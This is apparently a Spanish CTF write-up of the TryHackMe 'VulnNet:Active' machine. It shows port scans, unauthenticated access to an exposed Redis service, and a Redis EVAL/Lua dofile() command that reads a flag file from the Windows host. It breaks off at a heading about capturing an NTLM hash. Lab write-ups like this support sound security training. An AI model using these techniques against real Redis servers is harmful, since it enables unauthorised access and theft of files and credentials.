## TryHackMe  <> VulnNet:Active

![image](https://github.com/Esevka/CTF/assets/139042999/c8b2b883-92a5-4ef7-9caf-9ef5029519b8)

Enlace Maquina: https://tryhackme.com/room/vulnnetactive

Enunciado : 

  - Obtener acceso completo al sistema y comprometer dominio.
  - Conseguir Flags
---

## Escaneo de puertos (NMAP).

-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# nmap -p- -open -sS --min-rate 5000 -n -Pn -vvv 10.10.12.222 -oG open_ports                                                                              
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 06:32 CEST
    
    PORT      STATE SERVICE      REASON
    53/tcp    open  domain       syn-ack ttl 127
    135/tcp   open  msrpc        syn-ack ttl 127
    139/tcp   open  netbios-ssn  syn-ack ttl 127
    445/tcp   open  microsoft-ds syn-ack ttl 127
    464/tcp   open  kpasswd5     syn-ack ttl 127
    6379/tcp  open  redis        syn-ack ttl 127
    9389/tcp  open  adws         syn-ack ttl 127
    49665/tcp open  unknown      syn-ack ttl 127
    49668/tcp open  unknown      syn-ack ttl 127
    49669/tcp open  unknown      syn-ack ttl 127
    49670/tcp open  unknown      syn-ack ttl 127
    49684/tcp open  unknown      syn-ack ttl 127
    49698/tcp open  unknown      syn-ack ttl 127

  -Extraemos los puertos de la captura anterior para lanzarles unos scripts basicos de reconocimiento.

  Utilizamos un Script en bash simple pero de gran ayuda. Script-->  https://github.com/Esevka/CTF/tree/main/Bash

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# list_port open_ports              
    
    [+]Puertos Disponibles --> (Copiados en el Clipboard)
    
    53,135,139,445,464,6379,9389,49665,49668,49669,49670,49684,49698


  -Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# nmap -p 53,135,139,445,464,6379,9389,49665,49668,49669,49670,49684,49698 -sCV -n -Pn 10.10.12.222 -vvv -oN info_ports
    
    PORT      STATE SERVICE       REASON          VERSION
    53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
    135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds? syn-ack ttl 127
    464/tcp   open  kpasswd5?     syn-ack ttl 127
    6379/tcp  open  redis         syn-ack ttl 127 Redis key-value store 2.8.2402
    9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
    49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
    49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49684/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
---
## Analizamos la informacion obtenida sobre los puertos.

La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay un puerto que llama la atencion.

--Puerto 6379 (Redis)

    Que es Redis?
    
    Redis es una base de datos en memoria de código abierto y un almacén de datos de tipo clave-valor.
    
    Esto significa que los ejemplos de uso de Redis no se parecerán a las tablas de una base de datos relacional típica,
    sino que se centrarán en cómo almacenar y recuperar datos utilizando claves.

    Redis es eficiente en la gestión de datos clave-valor y es especialmente útil para almacenar datos temporales, configuraciones, caché 
    y en situaciones donde se requiere alta velocidad y baja latencia.

  Info--> Redis Pentesting[+] https://exploit-notes.hdks.org/exploit/database/redis-pentesting/

  1)Conectamos a la BD sin credenciales a ver si podemos obtener algo.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# redis-cli -h 10.10.12.222
    10.10.12.222:6379> 

  2)Listamos el número de claves que continenen las bases de datos, no hay nada.
    
    10.10.12.222:6379[3]> info keyspace
    # Keyspace

  3)Listamos todas las configuraciones y sus valores actuales.
  
    102) "no"
    103) "dir"
    104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"  ---> INTERESANTE
    105) "maxmemory-policy"

  De la linea 104 deducimos que --> enterprise-security <-- es un usuario local del sistema, por lo que ya tenemos un usuario del sistema.

    Info: Redis mediante el comando EVAL nos permite ejecutar scripts en Lua los cuales deben ser pasados como cadena(String).


  4)Sabiendo esto podriamos leer la flag de usuario.(La ip cambia hemos tenido que reiniciar la maquina.)

    10.10.240.193:6379> Eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
    (error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near 
    '3eb176aee96---------0bc93580b291e'

  5)Capturamos el Hash NTLM del usuario
    
  



    


    
    




  






  

  


